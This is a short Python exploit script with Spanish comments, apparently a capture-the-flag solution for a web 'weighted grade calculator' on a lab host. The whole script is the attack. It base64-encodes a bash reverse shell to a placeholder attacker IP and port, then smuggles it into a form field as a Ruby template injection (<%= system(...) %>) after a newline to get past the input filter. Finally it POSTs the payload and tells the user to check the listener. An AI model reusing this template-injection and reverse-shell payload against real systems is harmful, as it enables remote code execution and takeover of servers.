 
import requests
import base64


   │ # URL de la máquina atacada
   5   │ url = "http://10.10.11.25/weighted-grade-calc"
   6   │ 
   7   │ # Shell inversa para conectarse a la máquina atacante
   8   │ rev_shell = b'/bin/bash -i >& /dev/tcp/IP ATACANTE/PUERTO ATACANTE 0>&1'
   9   │ 
  10   │ # Codificación base64 del comando de shell inverso
  11   │ encoded_data = base64.b64encode(rev_shell)
  12   │ remove_byte = encoded_data.decode('utf-8')
  13   │ 
  14   │ # Payload con el comando para decodificar y ejecutar el shell inverso
  15   │ payload_data = {
  16   │     "category1": f"test\n<%= system('echo \"{remove_byte}\" | base64 -d | bash') %>",
  17   │     "grade1": "46",  
  18   │     "weight1": "50",
  19   │ 
  20   │     "category2": "admin",
  21   │     "grade2": "46",  
  22   │     "weight2": "20",
  23   │ 
  24   │     "category3": "hello",
  25   │     "grade3": "46",  
  26   │     "weight3": "10",
  27   │ 
  28   │     "category4": "world",
  29   │     "grade4": "46",  
  30   │     "weight4": "10",
  31   │ 
  32   │     "category5": "N/A",
  33   │     "grade5": "46",  
  34   │     "weight5": "10"
  35   │ }
  36   │ 
  37   │ print("[+] Payload is being executed.. \n[+]..now check your listener")
  38   │ 
  39   │ # Enviar la solicitud POST con el payload
  40   │ r = requests.post(url, data=payload_data)
  41   │ 
  42   │ # Verificar si el payload fue bloqueado
  43   │ if "Malicious input blocked" in r.text:
  44   │     print("[-] Failed to execute payload, it was blocked")
  45   │ else:
  46   │     print("[+] Payload executed successfully")